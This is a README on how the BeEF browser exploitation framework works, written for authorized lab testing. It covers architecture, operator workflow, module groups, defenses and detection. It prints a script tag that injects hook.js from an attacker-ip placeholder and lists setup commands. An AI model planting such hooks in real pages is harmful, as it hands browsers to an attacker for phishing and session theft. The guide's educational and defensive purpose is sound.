# BeEF-XSS — How It Works (GitHub-Ready README)


---

> ⚠️ **Ethics & scope** — This document is for **education, testing, and authorized penetration testing only**. Do **not** deploy hooks or modules against systems you do not own or do not have explicit written permission to test. Misuse is illegal and unethical.

---

# What this README contains

* What BeEF is (architecture & intent)
* How BeEF works (end-to-end process) — conceptual + safe, lab-oriented commands only
* Delivery vectors for the hook (how the hook gets into a browser)
* Typical workflow an operator follows in a lab
* Core module groups and realistic outcomes (impact)
* Defensive controls and detection guidance (how defenders stop/reduce BeEF impact)
* Lab safety, logging, and reporting notes
* Troubleshooting & quick commands (lab use only)

---

# What is BeEF?

BeEF (Browser Exploitation Framework) is a specialized post-exploitation tool that targets the **browser** — not the host OS — to demonstrate the impact of client-side vulnerabilities. It provides:

* a tiny JavaScript “hook” that runs in victim browsers,
* a web-based command-and-control (C2) dashboard for operators, and
* a library of modules to perform reconnaissance, social engineering, and browser-centric actions.

In short: BeEF turns a browser into a controlled test-agent so you can demonstrate real business impact from XSS, social engineering, or other delivery methods.

---

# Architecture (high level, pro view)

* **Hook (hook.js)** — lightweight JavaScript downloaded by a victim browser. It establishes a persistent (pull-style) channel to the BeEF server.
* **BeEF server (C2/dashboard)** — web app (default port 3000) where operators view hooked browsers and run modules.
* **Modules** — discrete actions (recon, UI popups, proxying, exploit attempts). Modular design makes custom modules straightforward.
* **Transport** — HTTP / WebSocket polling from browser → server. Because communication is browser-initiated, BeEF works in many NAT/firewall scenarios.

---

# How BeEF works — conceptual process (step-by-step)

This is the *process flow* you should understand and be able to reproduce safely in a lab.

1. **Provision attacker & victim environments**

   * Attacker: Kali VM (BeEF + admin browser).
   * Victim(s): isolated VM(s) with browsers (Firefox, Chrome) on an internal-only network.
   * Use snapshots and host-only/internal networking — never expose lab to the Internet.

2. **Deploy & configure BeEF on the attacker**

   * Install from distro package or Git (lab machines).
   * Configure `config.yaml`: set `beef.http.host` to the attacker VM IP on the isolated network and change default credentials.
   * Start the service and confirm the UI is reachable on the internal IP and port.

3. **Create a delivery vector that causes a browser to load `hook.js`**
   Common safe lab vectors:

   * Serving a controlled test HTML page that includes the hook.
   * Injecting the hook into a purposely vulnerable target (DVWA / Juice Shop) running in your lab.
   * Crafting a phishing page hosted on your lab webserver (only for lab victims).

4. **Victim browser loads the hook**

   * The browser executes `hook.js`. The script registers with the BeEF server and appears in the dashboard as a “hooked browser.”

5. **Operator selects a hooked browser and runs modules**

   * Use recon modules first (fingerprint browser, enumerate plugins).
   * Use social engineering modules next (fake prompts, overlays) if you’re demonstrating user-trick techniques.
   * Collect results and evidence; keep everything documented.

6. **Post-hook activities (lab only)**

   * Limited pivoting: use the hooked browser as an HTTP client/proxy to probe internal hosts (no guaranteed persistence).
   * Run calibrated demonstrations that show credential capture risks, cookie leakage, or internal resource access (always anonymized/simulated).

7. **Tear down & revert**

   * Revert victim snapshots. Preserve logs and reports for the engagement.

---

# Safe, minimal example artifacts (lab-only)

These are the *conceptual* pieces you will use in a lab. Do **not** use them on third-party sites.

**Hook tag (what the hook looks like)**

```html
<!-- Lab-only, served from attacker VM -->
<script src="http://<attacker-ip>:3000/hook.js"></script>
```

**What happens when the tag is loaded**

* Browser fetches `hook.js` from the attacker.
* Hook opens a persistent polling channel and shows up in the BeEF UI.

---

# Typical operator workflow (20-year pro habits)

1. **Update & secure the attacker VM** — change BeEF defaults, run updates, enable logs.
2. **Document the target scope & get written authorization** — legal paperwork before any testing.
3. **Start small recon** — run light, non-noisy modules first to fingerprint the browser.
4. **Validate impact without exfiltrating sensitive data** — screenshots or synthetic credentials that prove concept without exposing real data.
5. **Escalate demonstration only with explicit permission** — e.g., show how a fake login can harvest credentials in a safe, controlled way.
6. **Produce an impact report** — what was possible, how it happened, how to fix it (with prioritized remediation).
7. **Restore environment** — revert snapshots, clear server logs (for chain-of-custody preserve audit copies as needed).

---

# Core module groups & what they demonstrate

(Explain impact; do not supply malicious recipes.)

* **Recon Modules** — show browser configuration, extension list, OS, screen size, IP. *Impact*: demonstrates the amount of intelligence available to an attacker.
* **Social Engineering Modules** — fake dialogs, fake update prompts, credential collection overlays. *Impact*: shows how users can be tricked into revealing secrets.
* **Exfiltration Helpers** — read DOM, attempt to access clientside data accessible to JS. *Impact*: shows cookie/session risk where HTTPOnly not used.
* **Networking Helpers** — use the hooked browser to request internal/internal-only URLs. *Impact*: demonstrates low-confidence pivoting into internal nets.
* **Exploit Modules** — attempt to exploit client vulnerabilities (dependent on outdated browser/plugins). *Impact*: demonstrates risk of unpatched clients but is unreliable on modern browsers.

---

# Defenses (practical — prioritized)

If you can fix only three things, do these in order:

1. **Eliminate XSS at the source**

   * Proper input validation and context-aware output encoding. This removes the primary vector used to inject `hook.js`.

2. **Implement a strong Content Security Policy (CSP)**

   * Disallow inline scripts and restrict script sources to trusted hosts. A correctly configured CSP can block external hooks.

3. **Cookie hygiene**

   * Set `HttpOnly`, `Secure`, and `SameSite` attributes on session cookies so client-side JS cannot access session tokens.

Additional controls:

* Subresource Integrity (SRI) for third-party scripts.
* WAF rules and payload detection for common XSS patterns.
* Browser hardening and patch management.
* Outbound network monitoring for unusual script fetches (e.g., many clients pulling `http://attacker:3000/hook.js`).

---

# Detection guidance (what defenders look for)

* Repeated client requests for `/hook.js` or unknown JS endpoints from multiple internal clients.
* Unusual POST/GET patterns from browsers to an internal host that behaves like a C2 server.
* Browser console errors or network logs showing script loads from unexpected origins.
* IDS/Proxy alerts on scripts served from non-approved hosts.

Document these indicators in your reports so defenders can craft signatures and monitoring rules.

---

# Lab safety & reporting (professional checklist)

* Use **host-only / internal networking**. Never connect your attacker VM to a public network for live testing.
* Snapshots: take one *before* any action and revert after tests.
* Never collect or expose real user data. Use synthetic credentials for demonstrations.
* Maintain a **rules of engagement** document and keep copies of authorization.
* Log everything: timestamps, commands, module names, output, screenshots. Include remediation steps in the final report.

---

# Troubleshooting (quick, lab-focused)

* BeEF UI unreachable: check `beef.http.host` and `beef.http.port` in `config.yaml` and ensure attacker VM IP is accessible.
* Hook not appearing: confirm the victim browser can fetch `http://<attacker-ip>:3000/hook.js` (use browser devtools Network tab).
* Modules fail: modern browsers restrict actions — update the environment to reflect realistic client configurations or simulate older clients if demonstrating legacy impact.
* Package issues: run `sudo apt update && sudo apt install beef-xss` (or install from source for bleeding-edge labs).

---

# Quick commands (lab use only)

```bash
# start BeEF (systemd)
sudo systemctl start beef-xss
sudo systemctl status beef-xss

# check listening port from attacker VM
ss -tuln | grep 3000

# verify victim can fetch hook (on victim VM)
curl -I http://<attacker-ip>:3000/hook.js

# find attacker IP (host-only/internal interface)
ip addr show
```

---

# Final pro notes 

* **BeEF is a demonstration tool**: its value is showing stakeholders *what could happen* when client-side controls fail. Use it to make security tangible.
* **Defensive thinking first**: before you run modules, assume the client will be logged, monitored, and patched — your objective is to produce a realistic, auditable demonstration.
* **Ethics and paperwork matter more than technique**: no report, no test. Always have written authorization and a clear scope.
* **Teach to improve**: your remediation should be actionable and prioritized — fix XSS, enforce CSP, and harden cookies first.


